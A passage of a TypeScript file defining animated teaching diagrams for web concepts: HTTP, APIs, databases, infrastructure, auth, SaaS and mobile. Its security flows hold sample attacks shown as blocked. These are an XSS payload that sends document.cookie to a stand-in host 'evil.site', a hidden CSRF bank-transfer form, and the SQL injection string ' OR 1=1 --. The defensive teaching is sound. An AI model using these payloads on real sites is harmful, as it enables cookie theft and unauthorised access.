/**
 * Step-by-step flows for the concept library (one per concept id in web-concepts.ts). Each flow is a few nodes with
 * icons and a sequence of steps; every step sends a labelled packet from one node to another, with a caption and,
 * often, the payload that travels. Coordinates are in a 320×150 box.
 */
export type FIcon = "browser" | "server" | "db" | "phone" | "user" | "cloud" | "globe" | "code" | "file" | "box" | "shield" | "queue" | "key" | "bolt" | "chart" | "bell" | "lock" | "clock" | "robot" | "spark" | "chat" | "sheet" | "mail";
export type FTone = "req" | "res" | "ok" | "bad" | "data";
export type FNode = { id: string; x: number; y: number; label: string; icon?: FIcon; sub?: string; tone?: "default" | "dark" | "ok" | "bad" | "accent"; w?: number; h?: number };
export type FStep = { from: string; to: string; tag: string; say: string; tone?: FTone; payload?: string; stop?: boolean };
export type Flow = { nodes: FNode[]; steps: FStep[] };

const n = (id: string, x: number, y: number, label: string, icon?: FIcon, sub?: string, tone?: FNode["tone"], w?: number): FNode => ({ id, x, y, label, icon, sub, tone, w });
const s = (from: string, to: string, tag: string, say: string, tone: FTone = "req", payload?: string, stop?: boolean): FStep => ({ from, to, tag, say, tone, payload, stop });

export const FLOWS: Record<string, Flow> = {
  /* ---------------------------------------------------------------- Interface */
  components: {
    nodes: [n("you", 42, 75, "You", "user"), n("btn", 160, 32, "AddButton", "code", "component"), n("state", 160, 118, "cart state", "box", "count: 3 → 4", "dark"), n("badge", 274, 32, "CartBadge", "code", "re-renders")],
    steps: [
      s("you", "btn", "click", "You click the Add button, a small reusable component."),
      s("btn", "state", "count + 1", "Its handler updates the shared state.", "data", "setCount((c) => c + 1)"),
      s("state", "badge", "count: 4", "Only components that read this state are redrawn.", "res"),
      s("badge", "you", "4 items", "The new number appears instantly; nothing else on the page moved.", "ok"),
    ],
  },
  responsive: {
    nodes: [n("css", 62, 75, "One stylesheet", "code", "breakpoints"), n("desk", 254, 30, "Desktop", "browser", "≥ 1024 px: 3 columns"), n("tab", 254, 75, "Tablet", "browser", "768 px: 2 columns"), n("ph", 254, 120, "Phone", "phone", "< 640 px: 1 column")],
    steps: [
      s("css", "desk", "lg: 3 cols", "Wide screens get three columns and a sidebar.", "data", '<div class="grid md:grid-cols-2 lg:grid-cols-3">'),
      s("css", "tab", "md: 2 cols", "At tablet width the same HTML re-flows into two columns.", "data"),
      s("css", "ph", "1 col", "On a phone everything stacks; menus fold into a button.", "ok"),
    ],
  },
  a11y: {
    nodes: [n("btn", 58, 75, "<button>", "code", 'aria-label="Close"'), n("tree", 168, 75, "Accessibility tree", "box", "role · name · state", "dark"), n("sr", 276, 32, "Screen reader", "user"), n("kb", 276, 118, "Keyboard", "key", "Tab · Enter")],
    steps: [
      s("btn", "tree", "role: button", "The browser turns real HTML elements into an accessibility tree.", "data"),
      s("tree", "sr", "“Close dialog”", "A screen reader announces the label, not the × symbol.", "res"),
      s("kb", "btn", "Tab, Enter", "Keyboard users can reach it and press it without a mouse.", "ok"),
    ],
  },
  rendering: {
    nodes: [n("build", 62, 30, "Build step", "code", "static"), n("srv", 62, 75, "Server", "server", "per request"), n("br", 62, 120, "Browser", "browser", "client side"), n("html", 266, 75, "HTML page", "file", "what you see", "dark")],
    steps: [
      s("build", "html", "at deploy", "Static: built once when the site is deployed, then served from a CDN. Fastest.", "ok"),
      s("srv", "html", "per visit", "Server: built fresh for every request, so it can be personal and up to date.", "data"),
      s("br", "html", "in JS", "Client: an almost empty page arrives, then JavaScript builds it in the browser.", "req"),
    ],
  },
  hydration: {
    nodes: [n("srv", 50, 75, "Server", "server"), n("html", 164, 32, "HTML", "file", "visible at once"), n("js", 164, 118, "JS bundle", "code", "arrives later"), n("live", 274, 75, "Interactive", "browser", "clicks work", "ok")],
    steps: [
      s("srv", "html", "HTML", "The server sends finished HTML, so the page is readable immediately.", "res"),
      s("srv", "js", "app.js", "The JavaScript bundle follows a moment later.", "data"),
      s("js", "live", "hydrate()", "React walks the HTML already on screen and attaches event handlers.", "req", "hydrateRoot(document, <App />)"),
      s("html", "live", "same DOM", "Nothing is redrawn: the same elements simply start responding.", "ok"),
    ],
  },
  routing: {
    nodes: [n("link", 56, 75, "<Link>", "code", "href=/tools"), n("router", 166, 75, "Router", "box", "in the browser", "dark"), n("view", 274, 32, "Tools view", "browser"), n("url", 274, 118, "Address bar", "globe", "/web-mobile/tools")],
    steps: [
      s("link", "router", "click", "The router catches the click instead of letting the browser reload."),
      s("router", "view", "load + swap", "It fetches only what the next view needs and swaps that part of the page.", "data"),
      s("router", "url", "pushState", "It updates the address, so Back, Forward and sharing still work.", "ok", "history.pushState({}, '', '/skills/web-mobile/tools')"),
    ],
  },
  /* ---------------------------------------------------------------- API */
  http: {
    nodes: [n("br", 60, 75, "Browser", "browser", "client"), n("srv", 260, 75, "Server", "server", "example.com")],
    steps: [
      s("br", "srv", "GET /tools", "The browser sends a method, a path and headers.", "req", "GET /skills/web-mobile/tools HTTP/2\nHost: example.com\nAccept: text/html\nAccept-Encoding: br, gzip"),
      s("srv", "br", "200 OK", "The server answers with a status line, headers and the body.", "res", "HTTP/2 200\ncontent-type: text/html; charset=utf-8\ncache-control: s-maxage=31536000\n\n<!doctype html>…"),
      s("br", "srv", "GET app.js", "The HTML mentions scripts, styles and images: each is another request.", "req"),
      s("srv", "br", "200 · 84 KB", "Every file comes back the same way, often in parallel over one connection.", "res"),
    ],
  },
  status: {
    nodes: [n("cl", 60, 75, "Client", "browser"), n("api", 260, 75, "API", "server", "/stores", "dark")],
    steps: [
      s("cl", "api", "GET /stores/12", "Ask for store 12."),
      s("api", "cl", "200 OK", "2xx: success, here it is.", "ok", '{ "id": 12, "name": "Toko Makmur" }'),
      s("cl", "api", "GET /stores/999", "Ask for a store that doesn't exist."),
      s("api", "cl", "404 Not Found", "4xx: the client asked for something wrong.", "bad", '{ "error": "Not found" }'),
      s("cl", "api", "POST /stores", "Create a store, but the server has a bug."),
      s("api", "cl", "500 Error", "5xx: the server failed; not the client's fault.", "bad"),
    ],
  },
  rest: {
    nodes: [n("cl", 56, 75, "Client", "code"), n("list", 260, 32, "/stores", "db", "the collection"), n("one", 260, 118, "/stores/12", "db", "one resource")],
    steps: [
      s("cl", "list", "GET", "Read the list of stores.", "req", "GET /api/stores"),
      s("cl", "list", "POST {…}", "Create a store: the server answers 201 Created with its new URL.", "data", 'POST /api/stores\n{ "name": "Warung Sari" }'),
      s("cl", "one", "PATCH {city}", "Change one field of store 12.", "data", 'PATCH /api/stores/12\n{ "city": "Makassar" }'),
      s("cl", "one", "DELETE", "Remove store 12: 204 No Content.", "bad", "DELETE /api/stores/12"),
    ],
  },
  graphql: {
    nodes: [n("app", 56, 75, "App", "phone"), n("gql", 166, 75, "GraphQL", "server", "one endpoint", "dark"), n("st", 274, 32, "Stores", "db"), n("rv", 274, 118, "Reviews", "db")],
    steps: [
      s("app", "gql", "query", "The app describes the exact shape of data it wants.", "req", "query {\n  store(id: 12) {\n    name\n    reviews { stars }\n  }\n}"),
      s("gql", "st", "name", "The server fetches each field from wherever it lives…", "data"),
      s("gql", "rv", "stars", "…including related data, in the same request.", "data"),
      s("gql", "app", "that shape", "The answer mirrors the query: nothing more, nothing less.", "res", '{ "store": { "name": "Toko Makmur", "reviews": [{ "stars": 5 }] } }'),
    ],
  },
  json: {
    nodes: [n("py", 56, 75, "Python dict", "code", "on the server"), n("txt", 164, 75, "JSON text", "file", "over the wire", "dark"), n("js", 272, 75, "JS object", "code", "in the browser")],
    steps: [
      s("py", "txt", "json.dumps()", "The server turns its data into plain JSON text.", "data", '{"id": 12, "name": "Toko Makmur", "open": true, "tags": ["grocery"]}'),
      s("txt", "js", "JSON.parse()", "Any language reads it back into its own objects.", "res", "const store = await res.json();\nstore.tags[0] // \"grocery\""),
    ],
  },
  webhooks: {
    nodes: [n("cust", 52, 118, "Customer", "user"), n("prov", 164, 75, "Payment provider", "cloud", "", "dark"), n("app", 272, 32, "Your app", "server", "/webhooks/pay")],
    steps: [
      s("app", "prov", "create payment", "Your app opens a payment for order 1234."),
      s("cust", "prov", "pays", "The customer pays on the provider's page.", "data"),
      s("prov", "app", "POST event", "Seconds later the provider calls your URL; you never had to poll.", "res", 'POST /webhooks/pay\n{ "type": "payment.succeeded", "order": "1234" }'),
      s("app", "prov", "200", "You answer 200 quickly, or it will retry the event.", "ok"),
    ],
  },
  realtime: {
    nodes: [n("a", 56, 32, "Rina", "browser"), n("b", 56, 118, "Budi", "browser"), n("srv", 262, 75, "Chat server", "server", "WebSocket", "dark")],
    steps: [
      s("a", "srv", "open socket", "Each browser opens one long-lived connection.", "data", "const ws = new WebSocket('wss://chat.example.com')"),
      s("b", "srv", "open socket", "The line stays open in both directions.", "data"),
      s("a", "srv", "“halo!”", "Rina sends a message over her open connection."),
      s("srv", "b", "push", "The server pushes it to Budi at once; no refresh, no polling.", "res"),
      s("srv", "a", "✓ delivered", "And confirms delivery back to Rina.", "ok"),
    ],
  },
  cors: {
    nodes: [n("page", 54, 75, "This page", "code", "your-site.com"), n("br", 164, 75, "Browser", "shield", "the gatekeeper", "dark"), n("api", 272, 75, "other.com", "server")],
    steps: [
      s("page", "br", "fetch()", "Your script asks the browser to read another site."),
      s("br", "api", "GET + Origin", "The browser sends the request, saying where it comes from.", "req", "GET /data\nOrigin: https://your-site.com"),
      s("api", "br", "no Allow-Origin", "The other site answers, without allowing your origin.", "data", "HTTP/1.1 200 OK\ncontent-type: application/json\n(no Access-Control-Allow-Origin)"),
      s("br", "page", "blocked", "The browser refuses to hand the response to your script.", "bad", "TypeError: Failed to fetch", true),
    ],
  },
  ratelimit: {
    nodes: [n("cl", 50, 75, "Client", "user"), n("lim", 162, 75, "Limiter", "shield", "5 tokens / s", "dark"), n("api", 272, 75, "API", "server")],
    steps: [
      s("cl", "lim", "req 1–5", "Each request takes a token from the bucket."),
      s("lim", "api", "allowed", "Within the limit: passed through to the API.", "ok"),
      s("cl", "lim", "req 6", "The bucket is empty for this second."),
      s("lim", "cl", "429", "Too Many Requests, with a hint when to try again.", "bad", "HTTP/1.1 429 Too Many Requests\nRetry-After: 1"),
    ],
  },
  /* ---------------------------------------------------------------- Business logic */
  validation: {
    nodes: [n("form", 52, 75, "Form", "browser"), n("val", 162, 75, "Validator", "shield", "on the server", "dark"), n("db", 272, 75, "Database", "db")],
    steps: [
      s("form", "val", "email: abc", "Input arrives from the form."),
      s("val", "form", "400 invalid", "Rejected with a message the form can show.", "bad", '{ "email": "must be a valid address" }'),
      s("form", "val", "rina@…", "The user fixes it and submits again."),
      s("val", "db", "save", "Only checked data reaches the database.", "ok"),
    ],
  },
  queues: {
    nodes: [n("u", 40, 75, "You", "user"), n("api", 122, 32, "API", "server"), n("q", 200, 118, "Queue", "queue", "jobs"), n("w", 282, 32, "Worker", "box", "background", "dark")],
    steps: [
      s("u", "api", "export", "You ask for a big report."),
      s("api", "q", "job #88", "The API puts a job on the queue instead of doing the slow work.", "data", '{ "job": "report.export", "user": 42 }'),
      s("api", "u", "202 Accepted", "…and answers at once: “we'll email it”.", "res"),
      s("q", "w", "take job", "A worker picks up the job in the background.", "data"),
      s("w", "u", "email: ready", "Done minutes later; failed jobs are retried automatically.", "ok"),
    ],
  },
  idempotency: {
    nodes: [n("app", 52, 75, "App", "phone"), n("api", 162, 75, "Payments API", "server", "remembers keys", "dark"), n("bank", 272, 75, "Bank", "key")],
    steps: [
      s("app", "api", "pay · key 7f3a", "The first attempt carries an idempotency key.", "req", "POST /payments\nIdempotency-Key: 7f3a…\n{ \"amount\": 185000 }"),
      s("api", "bank", "charge", "The card is charged once.", "data"),
      s("app", "api", "retry · 7f3a", "The connection dropped, so the app retries with the same key."),
      s("api", "app", "same result", "The API recognises the key and returns the first result: still one charge.", "ok"),
    ],
  },
  /* ---------------------------------------------------------------- Data */
  sqlnosql: {
    nodes: [n("app", 56, 75, "App", "code"), n("sql", 262, 32, "PostgreSQL", "db", "tables + joins"), n("doc", 262, 118, "Firestore", "db", "documents", "dark")],
    steps: [
      s("app", "sql", "JOIN", "SQL keeps orders and customers in separate tables and joins them.", "req", "SELECT o.id, c.name\nFROM orders o\nJOIN customers c ON c.id = o.customer_id"),
      s("sql", "app", "rows", "Strict schema, reliable relations.", "res"),
      s("app", "doc", "get order", "A document database stores the order with everything nested inside.", "req", "db.collection('orders').doc('1234').get()"),
      s("doc", "app", "1 document", "Flexible shape, one read, no joins.", "res", '{ "id": "1234", "customer": { "name": "Rina" }, "items": [ … ] }'),
    ],
  },
  orm: {
    nodes: [n("code", 54, 75, "Your code", "code"), n("orm", 162, 75, "ORM", "box", "Prisma", "dark"), n("db", 272, 75, "Database", "db")],
    steps: [
      s("code", "orm", "findUnique", "You write a typed call in your own language.", "req", "await db.store.findUnique({ where: { id: 12 } })"),
      s("orm", "db", "SQL", "The ORM turns it into safe, parameterised SQL.", "data", 'SELECT "id", "name" FROM "Store" WHERE "id" = $1'),
      s("db", "orm", "row", "The database returns a row.", "res"),
      s("orm", "code", "Store", "You get a typed object back, with autocomplete.", "ok"),
    ],
  },
  indexes: {
    nodes: [n("q", 54, 75, "Query", "code", "WHERE id = 7"), n("idx", 164, 32, "B-tree index", "box", "sorted", "dark"), n("rows", 272, 75, "Table", "db", "200,000 rows")],
    steps: [
      s("q", "rows", "scan…", "Without an index the database reads row after row.", "bad", "Seq Scan on stores  (rows=200000)"),
      s("q", "idx", "look up", "With an index it walks down a sorted tree…", "req", "Index Scan using stores_pkey"),
      s("idx", "rows", "row 7", "…and lands on the row in a handful of steps.", "ok"),
    ],
  },
  transactions: {
    nodes: [n("app", 56, 75, "Checkout", "code"), n("db", 262, 75, "Database", "db", "ACID", "dark")],
    steps: [
      s("app", "db", "BEGIN", "Start a transaction.", "req"),
      s("app", "db", "stock − 1", "Take the item out of stock.", "data", "UPDATE products SET stock = stock - 1 WHERE id = 12"),
      s("app", "db", "insert order", "Create the order.", "data", "INSERT INTO orders (product_id, …) VALUES (12, …)"),
      s("app", "db", "COMMIT", "Both changes become permanent together. Had anything failed, ROLLBACK would undo both.", "ok"),
    ],
  },
  caching: {
    nodes: [n("cl", 52, 75, "Request", "browser"), n("cache", 162, 75, "Cache", "bolt", "Redis · in memory", "dark"), n("db", 272, 75, "Database", "db", "slower")],
    steps: [
      s("cl", "cache", "product:12?", "First, ask the cache."),
      s("cache", "db", "miss → query", "Not there yet, so ask the database.", "data"),
      s("db", "cache", "store copy", "Keep a copy for next time, with an expiry.", "res", "SET product:12 '{…}' EX 300"),
      s("cl", "cache", "again", "The next request asks the cache again…"),
      s("cache", "cl", "hit ⚡", "…and gets it straight from memory.", "ok"),
    ],
  },
  storage: {
    nodes: [n("app", 52, 75, "App", "phone"), n("bkt", 166, 32, "Bucket", "cloud", "object storage"), n("db", 166, 118, "Database", "db", "just the URL"), n("cdn", 276, 75, "CDN", "globe", "near users", "dark")],
    steps: [
      s("app", "bkt", "upload 42.jpg", "The photo goes to a storage bucket, not the database.", "data"),
      s("app", "db", "save URL", "The database stores only where it is.", "req", 'UPDATE users SET photo = "gs://bucket/users/42.jpg" WHERE id = 42'),
      s("bkt", "cdn", "cache", "A CDN keeps copies close to every visitor.", "data"),
      s("cdn", "app", "fast image", "Everyone downloads it from nearby.", "ok"),
    ],
  },
  /* ---------------------------------------------------------------- Infrastructure */
  dns: {
    nodes: [n("br", 40, 75, "Browser", "browser", undefined, undefined, 68), n("res", 120, 75, "Resolver", "server", undefined, undefined, 68), n("root", 200, 32, "Root, .com", "globe", undefined, undefined, 72), n("ns", 280, 75, "Name server", "server", undefined, "dark", 72)],
    steps: [
      s("br", "res", "example.com?", "The browser asks its resolver (often your ISP or 1.1.1.1)."),
      s("res", "root", "who has .com?", "Not cached, so the resolver asks the root and .com servers.", "data"),
      s("root", "res", "ask ns1", "They point to the domain's own name server.", "res"),
      s("res", "ns", "example.com?", "The resolver asks the name server directly."),
      s("ns", "res", "IP address", "The authoritative answer comes back.", "res", "example.com.  3600  IN  A  <IP address>"),
      s("res", "br", "IP (cached)", "Cached for an hour; the browser can now connect.", "ok"),
    ],
  },
  cdn: {
    nodes: [n("v", 52, 32, "Visitor", "user", "in Makassar"), n("edge", 164, 32, "Edge server", "globe", "nearby"), n("org", 272, 118, "Origin", "server", "one place", "dark")],
    steps: [
      s("v", "edge", "GET /", "The visitor reaches the closest edge server."),
      s("edge", "org", "miss", "First time: the edge fetches the page from the origin.", "data"),
      s("org", "edge", "copy", "It keeps a copy for the next visitors.", "res", "cache-control: s-maxage=3600"),
      s("edge", "v", "fast", "Everyone nearby is now served in milliseconds.", "ok"),
    ],
  },
  containers: {
    nodes: [n("code", 44, 75, "Code + libs", "code", undefined, undefined, 74), n("bld", 128, 75, "docker build", "box", undefined, "dark", 78), n("img", 210, 75, "Image", "box", undefined, undefined, 64), n("lap", 284, 32, "Laptop", "browser", undefined, undefined, 64), n("cld", 284, 118, "Cloud Run", "cloud", undefined, undefined, 70)],
    steps: [
      s("code", "bld", "Dockerfile", "A Dockerfile lists how to build the app.", "req", 'FROM node:22-slim\nCOPY . .\nRUN npm ci && npm run build\nCMD ["npm", "start"]'),
      s("bld", "img", "image", "The result is one image with everything inside.", "data"),
      s("img", "lap", "run", "It runs the same on a laptop…", "ok"),
      s("img", "cld", "deploy", "…and on any cloud, unchanged.", "ok", "gcloud run deploy api --image gcr.io/…/api"),
    ],
  },
  cicd: {
    nodes: [n("push", 160, 24, "git push", "code"), n("test", 280, 75, "Tests", "shield"), n("build", 160, 126, "Build", "box", undefined, "dark"), n("dep", 40, 75, "Deploy", "cloud")],
    steps: [
      s("push", "test", "run CI", "Every push starts the pipeline automatically.", "req", "on: push\njobs:\n  test: { runs-on: ubuntu-latest, steps: [npm ci, npm test] }"),
      s("test", "build", "✓ passed", "Only code that passes the tests is built.", "ok"),
      s("build", "dep", "image", "The build is deployed, first as a preview link.", "data"),
      s("dep", "push", "live ✓", "Production updated in minutes; the next push starts again.", "ok"),
    ],
  },
  environments: {
    nodes: [n("dev", 52, 75, "Development", "code", "your laptop"), n("stg", 162, 75, "Staging", "server", "realistic data"), n("prod", 272, 75, "Production", "server", "real users", "dark")],
    steps: [
      s("dev", "stg", "merge", "Merged code deploys to staging first.", "req", "DATABASE_URL differs in every environment"),
      s("stg", "stg", "test", "Staging is checked with realistic data before anyone real sees it.", "data"),
      s("stg", "prod", "promote", "Then the very same build goes to production.", "ok"),
    ],
  },
  scaling: {
    nodes: [n("u", 40, 75, "Traffic", "user"), n("lb", 142, 75, "Load balancer", "shield", undefined, "dark"), n("s1", 274, 26, "Server 1", "server"), n("s2", 274, 75, "Server 2", "server"), n("s3", 274, 124, "Server 3", "server", "added at peak", "ok")],
    steps: [
      s("u", "lb", "requests", "All traffic arrives at a load balancer."),
      s("lb", "s1", "req", "It spreads requests across identical servers…", "data"),
      s("lb", "s2", "req", "…none of which keeps state of its own.", "data"),
      s("lb", "s3", "new server", "At peak a third one starts; at night they scale back down.", "ok"),
    ],
  },
  serverless: {
    nodes: [n("ev", 52, 75, "Photo uploaded", "file"), n("fn", 162, 75, "resize()", "code", "cold start", "dark"), n("out", 272, 75, "Thumbnail", "cloud")],
    steps: [
      s("ev", "fn", "event", "An upload wakes the function; if it was asleep, that's a cold start.", "req", 'export default async function resize(file) { … }'),
      s("fn", "out", "200 px.jpg", "It does its work in milliseconds…", "ok"),
      s("fn", "fn", "sleep", "…and sleeps again. You pay only for those milliseconds.", "data"),
    ],
  },
  /* ---------------------------------------------------------------- Auth & security */
  sessions: {
    nodes: [n("br", 56, 32, "Browser", "browser", "cookie"), n("srv", 262, 32, "Server", "server", "session store"), n("app", 56, 118, "App", "phone", "JWT"), n("api", 262, 118, "API", "server", "checks signature", "dark")],
    steps: [
      s("br", "srv", "sid=a8f3", "Session: the cookie holds only a random ID…", "req", "Cookie: sid=a8f3c2…"),
      s("srv", "br", "a8f3 → Rina", "…and the server looks it up in its session store.", "res"),
      s("app", "api", "Bearer eyJ…", "Token: the app sends a signed JWT that says who you are…", "req", "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyXzQyIn0.…"),
      s("api", "app", "✓ Rina, staff", "…the API verifies the signature; no lookup needed.", "ok"),
    ],
  },
  oauth: {
    nodes: [n("app", 52, 75, "Your app", "browser"), n("g", 166, 32, "Google", "globe", "sign-in page", "dark"), n("u", 166, 118, "You", "user"), n("srv", 276, 75, "Your server", "server")],
    steps: [
      s("app", "g", "redirect", "The app sends you to Google with its client ID.", "req", "https://accounts.google.com/o/oauth2/v2/auth?client_id=…&scope=openid email"),
      s("u", "g", "log in", "You sign in and consent on Google's page, not the app's.", "data"),
      s("g", "app", "?code=…", "Google sends you back with a one-time code.", "res"),
      s("app", "srv", "code", "Your server exchanges the code for tokens, server to server.", "data"),
      s("g", "srv", "id token", "Google confirms who you are; the app never saw your password.", "ok"),
    ],
  },
  rbac: {
    nodes: [n("u", 50, 75, "Budi", "user", "role: staff"), n("api", 160, 75, "API", "shield", "checks permission", "dark"), n("rep", 274, 26, "View reports", "chart", undefined, "ok"), n("sub", 274, 75, "Submit expense", "file", undefined, "ok"), n("apv", 274, 124, "Approve", "key", undefined, "bad")],
    steps: [
      s("u", "api", "GET /reports", "Budi asks for reports."),
      s("api", "rep", "allowed", "Staff may view reports.", "ok"),
      s("u", "api", "POST /approve", "Budi tries to approve an expense."),
      s("api", "apv", "403", "Only managers may approve: 403 Forbidden, checked on the server.", "bad", '{ "error": "missing permission: expenses.approve" }', true),
    ],
  },
  https: {
    nodes: [n("br", 56, 75, "Browser", "browser"), n("eve", 166, 124, "Café Wi-Fi", "user", "someone listening", "bad"), n("srv", 266, 75, "Server", "server", "certificate", "dark")],
    steps: [
      s("br", "srv", "ClientHello", "The browser offers the encryption it supports."),
      s("srv", "br", "certificate", "The server proves who it is with a certificate signed by a trusted authority.", "ok", "Subject: example.com\nIssuer: Let's Encrypt\nValid until: …"),
      s("br", "srv", "encrypted", "They agree on keys; from now on everything is encrypted.", "data"),
      s("br", "eve", "a7#9f…", "Anyone listening on the Wi-Fi sees only scrambled bytes.", "bad", undefined, true),
    ],
  },
  hashing: {
    nodes: [n("pw", 50, 75, "rahasia123", "key", "typed"), n("h", 162, 75, "bcrypt", "lock", "slow + salted", "dark"), n("db", 272, 75, "Database", "db", "only the hash")],
    steps: [
      s("pw", "h", "+ salt", "At sign-up the password is mixed with a random salt…"),
      s("h", "db", "$2b$12$…", "…and only the one-way hash is stored.", "ok", "$2b$12$Kj1v7Qe9yZ1c3fO2rX0e1uG9mJx…"),
      s("pw", "h", "login", "At login the typed password is hashed again with the same salt…"),
      s("h", "db", "compare", "…and compared. Nobody, not even the database admin, sees the password.", "ok"),
    ],
  },
  xss: {
    nodes: [n("att", 50, 75, "Attacker", "user", undefined, "bad"), n("app", 162, 75, "Comments", "server", "escapes output", "dark"), n("v", 272, 75, "Visitor", "browser")],
    steps: [
      s("att", "app", "<script>", "The attacker posts a comment containing a script.", "bad", "<script>fetch('evil.site?c=' + document.cookie)</script>"),
      s("app", "v", "escaped text", "The page shows it as text: &lt;script&gt;, never run.", "ok", "&lt;script&gt;fetch('evil.site?c=' + document.cookie)&lt;/script&gt;"),
    ],
  },
  csrf: {
    nodes: [n("evil", 52, 32, "evil.site", "globe", "hidden form", "bad"), n("br", 162, 118, "Your browser", "browser", "logged in to bank"), n("bank", 272, 32, "Bank", "server", "checks token", "dark")],
    steps: [
      s("evil", "br", "auto-submit", "A page you visit hides a form aimed at your bank.", "bad", '<form action="https://bank.example/transfer" method="POST">'),
      s("br", "bank", "POST + cookie?", "Your browser would attach your bank cookie… but SameSite blocks it.", "req"),
      s("bank", "br", "403", "No CSRF token, wrong origin: rejected.", "ok", "403 Forbidden: invalid CSRF token"),
    ],
  },
  sqli: {
    nodes: [n("in", 52, 75, "Input", "user", "' OR 1=1 --", "bad"), n("app", 162, 75, "Query", "code", "$1 parameter", "dark"), n("db", 272, 75, "Database", "db")],
    steps: [
      s("in", "app", "' OR 1=1 --", "Someone types SQL into the email field.", "bad"),
      s("app", "db", "WHERE email = $1", "The query and the input travel separately.", "data", 'SELECT * FROM users WHERE email = $1\nparams: ["\' OR 1=1 --"]'),
      s("db", "app", "0 rows", "The input is just text: no user has that email.", "ok"),
    ],
  },
  /* ---------------------------------------------------------------- SaaS */
  tenancy: {
    nodes: [n("a", 50, 32, "Company A", "user"), n("b", 50, 118, "Company B", "user"), n("app", 162, 75, "One app", "server", undefined, "dark"), n("db", 274, 75, "One database", "db", "tenant_id on every row")],
    steps: [
      s("a", "app", "GET /invoices", "Company A asks for its invoices."),
      s("app", "db", "tenant = A", "Every query is filtered by the signed-in tenant.", "data", "SELECT * FROM invoices WHERE tenant_id = 'A'"),
      s("b", "app", "GET /invoices", "Company B asks the very same endpoint."),
      s("app", "db", "tenant = B", "Same code, different rows. A and B never see each other's data.", "ok", "SELECT * FROM invoices WHERE tenant_id = 'B'"),
    ],
  },
  flags: {
    nodes: [n("code", 56, 75, "if (flag)", "code", "exports"), n("svc", 164, 75, "Flag service", "box", undefined, "dark"), n("free", 274, 26, "Free plan", "user", undefined, "bad"), n("pro", 274, 75, "Pro plan", "user", undefined, "ok"), n("stf", 274, 124, "Staff", "user", "beta")],
    steps: [
      s("code", "svc", "exports?", "New code is wrapped in a switch.", "req", "if (flags.isOn('exports', user)) showExportButton()"),
      s("svc", "free", "off", "Hidden on the free plan.", "bad"),
      s("svc", "pro", "on", "On for Pro customers.", "ok"),
      s("svc", "stf", "beta", "Staff try the next version first; no redeploy needed to change any of this.", "data"),
    ],
  },
  billing: {
    nodes: [n("sub", 160, 24, "Subscribe", "user"), n("chg", 280, 75, "Charge card", "key"), n("inv", 160, 126, "Invoice", "file", undefined, "dark"), n("ren", 40, 75, "Renew", "clock")],
    steps: [
      s("sub", "chg", "Pro · monthly", "A customer picks a plan."),
      s("chg", "inv", "paid ✓", "The payment provider charges and confirms by webhook.", "ok"),
      s("inv", "ren", "next month", "An invoice is emailed; the subscription waits for its renewal date.", "data"),
      s("ren", "chg", "auto-renew", "Renewals retry failed cards for a few days before pausing the account.", "req"),
    ],
  },
  audit: {
    nodes: [n("u", 50, 75, "Rina", "user"), n("app", 162, 75, "App", "server"), n("log", 272, 75, "Audit log", "file", "append-only", "dark")],
    steps: [
      s("u", "app", "price 50k → 55k", "Rina changes a price."),
      s("app", "log", "who · what · when", "The app writes a permanent record of the change.", "data", '{ "user": "rina", "action": "price.update", "from": 50000, "to": 55000, "at": "14:05" }'),
      s("log", "app", "who changed it?", "Months later, the question has an instant answer.", "res"),
    ],
  },
  /* ---------------------------------------------------------------- Mobile */
  releases: {
    nodes: [n("dev", 50, 75, "Build", "code", ".ipa · .aab"), n("store", 162, 75, "Store review", "shield", "Apple · Google", "dark"), n("ph", 272, 32, "Phones", "phone"), n("ota", 272, 118, "OTA update", "cloud", "JavaScript only")],
    steps: [
      s("dev", "store", "submit", "A signed build is submitted to the App Store and Google Play."),
      s("store", "ph", "approved", "After review it rolls out to phones.", "ok"),
      s("ota", "ph", "JS fix", "Small JavaScript fixes can ship over the air, within the stores' rules.", "data", "eas update --branch production"),
    ],
  },
  push: {
    nodes: [n("ph", 272, 75, "Phone", "phone", "app closed"), n("srv", 52, 75, "Your server", "server"), n("fcm", 162, 32, "APNs / FCM", "cloud", "Apple · Google", "dark")],
    steps: [
      s("ph", "srv", "device token", "With permission, the app registers and sends its device token."),
      s("srv", "fcm", "message + token", "Your server hands the message to Apple's or Google's push service.", "data", '{ "to": "ExponentPushToken[…]", "title": "Your order is on its way" }'),
      s("fcm", "ph", "notification", "It reaches the phone even though the app is closed.", "ok"),
    ],
  },
  offline: {
    nodes: [n("ph", 50, 75, "Phone", "phone", "no signal"), n("loc", 164, 32, "SQLite", "db", "on the phone"), n("q", 164, 118, "Outbox", "queue", "pending changes"), n("srv", 276, 75, "Server", "server", undefined, "dark")],
    steps: [
      s("ph", "loc", "save visit", "Saved on the phone first, so the app keeps working.", "data"),
      s("ph", "q", "queue change", "The change waits in an outbox.", "data"),
      s("q", "srv", "sync", "When the signal returns, the outbox is sent.", "req"),
      s("srv", "ph", "resolved", "Conflicts are settled (newest wins, or merge) and the phone is up to date.", "ok"),
    ],
  },
  deeplinks: {
    nodes: [n("mail", 52, 75, "Email link", "file", "/orders/1234"), n("os", 162, 75, "Phone OS", "phone", "app installed?", "dark"), n("app", 272, 32, "Order screen", "phone", "in the app", "ok"), n("web", 272, 118, "Website", "browser", "fallback")],
    steps: [
      s("mail", "os", "tap", "You tap a link to order 1234.", "req", "https://shop.example/orders/1234"),
      s("os", "app", "installed", "If the app is installed, it opens straight on that order.", "ok"),
      s("os", "web", "not installed", "If not, the same link opens the website instead.", "data"),
    ],
  },
  permissions: {
    nodes: [n("app", 52, 75, "App", "phone"), n("os", 162, 75, "Phone OS", "shield", undefined, "dark"), n("you", 272, 75, "You", "user")],
    steps: [
      s("app", "os", "need location", "The app explains why, then asks the system."),
      s("os", "you", "Allow?", "The system, not the app, asks you.", "data"),
      s("you", "os", "allow", "You allow it while using the app (and can change your mind later).", "ok"),
      s("os", "app", "GPS ✓", "The app gets location; if you'd refused, it should still work, just simpler.", "ok"),
    ],
  },
  /* ---------------------------------------------------------------- Observability */
  logs: {
    nodes: [n("api", 52, 32, "API", "server"), n("wk", 52, 118, "Worker", "box"), n("store", 164, 75, "Log store", "file", "searchable", "dark"), n("q", 274, 75, "Search", "code", "id=1234")],
    steps: [
      s("api", "store", "INFO", "The API logs the order it created.", "data", '{"t":"14:05:12","level":"info","msg":"order created","id":1234}'),
      s("wk", "store", "ERROR", "A worker logs a failed email for the same order.", "bad", '{"t":"14:05:15","level":"error","msg":"email failed","id":1234}'),
      s("q", "store", "id=1234", "Searching one id follows the request across servers.", "req"),
